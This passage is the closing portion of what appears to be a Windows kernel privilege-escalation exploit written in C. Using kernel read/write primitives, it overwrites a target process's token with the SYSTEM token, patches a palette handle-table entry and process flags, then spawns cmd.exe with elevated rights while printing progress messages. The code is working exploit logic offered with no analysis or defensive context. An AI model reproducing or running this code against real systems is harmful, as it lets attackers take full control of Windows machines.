	buffer1[5] = readQWORD((PBYTE)NextProcess + 0x358);
	writeQWORD1((PBYTE)NextProcess + 0x358, systemToken);
	buffer1[6] = readQWORD((PBYTE)NextProcess + 0x358);
	buffer1[7] = NextProcess;
	buffer1[8] = systemToken;
	TCHAR sysdir[MAX_PATH + 1];
	TCHAR cmdbuf[MAX_PATH*2];
	STARTUPINFO startupinfo;
	PROCESS_INFORMATION		processInfo;
	RtlSecureZeroMemory(&startupinfo, sizeof(startupinfo));
	RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
	startupinfo.cb = sizeof(startupinfo);
	GetStartupInfo(&startupinfo);
	DWORD cch = ExpandEnvironmentStrings(TEXT("%systemroot%\\system32\\"), sysdir, MAX_PATH);
	if (!cch) {
		exit(0);
	}
	RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
	_tcscpy(cmdbuf, sysdir);
	_tcscat(cmdbuf, TEXT("cmd.exe"));
	

	
	buffer1[10] = cmdbuf;
	buffer1[11] = readQWORD(gpHandler);
	buffer1[12] = readQWORD((PBYTE)buffer1[11]+0x10);
	buffer1[13] = gpHandler;
	buffer1[14] = readQWORD((PBYTE)buffer1[12] + 0x8);
	buffer1[15] = readQWORD(buffer1[11])&0xffff;
	//writeQWORD2(buffer1[11], 0);
	DWORD64 processhandle;
	processhandle = readQWORD(buffer1[14]) + (0x5f0 + 0x5f0 * 2) * 8;
	buffer1[1] = processhandle;
	
	for (int i = 0; i < buffer1[15]; ++i) {
		
		processhandle = readQWORD(buffer1[14]) + (i + i * 2) * 8;
		buffer1[1] = processhandle;
	
		if ((readQWORD((PBYTE)processhandle + 8) & 0xffff) == PID) {
			buffer1[0] = readQWORD((PBYTE)processhandle + 8);
			writeQWORD2(processhandle + 8, PID);
			
			/*
			if ((buffer1[0] & 0xF) == 0) {
				writeQWORD2(processhandle + 8, 0);
			}
			else {
				writeQWORD1(processhandle + 8, 0);
			}
			*/

			
			


		}
	}
	DWORD64 flag = readQWORD((PBYTE)NextProcess + 0x300);
	writeQWORD2((PBYTE)NextProcess + 0x300, flag ^ 0x4000000000000);
	//DWORD64 newFlag= 
	printf("[+] Overwrite palette handle entry\n");
	printf("[+] Spawning cmd\n");
	CreateProcess(cmdbuf, NULL, NULL, NULL, FALSE, 0, NULL,
		sysdir, &startupinfo, &processInfo);

	VirtualFree(ptr1, 0, MEM_RELEASE);
	VirtualFree(ptr2, 0, MEM_RELEASE);
	VirtualFree(ptr3, 0, MEM_RELEASE);
	VirtualFree(ptr4, 0, MEM_RELEASE);
	VirtualFree(ptr5, 0, MEM_RELEASE);
	VirtualFree(ptr6, 0, MEM_RELEASE);
	VirtualFree(ptr_jmpfunc, 0, MEM_RELEASE);
	//VirtualFree(buffer1, 0, MEM_RELEASE);
	VirtualFree(store_rop_shell, 0, MEM_RELEASE);
	

	exit(0);



	return 0;
}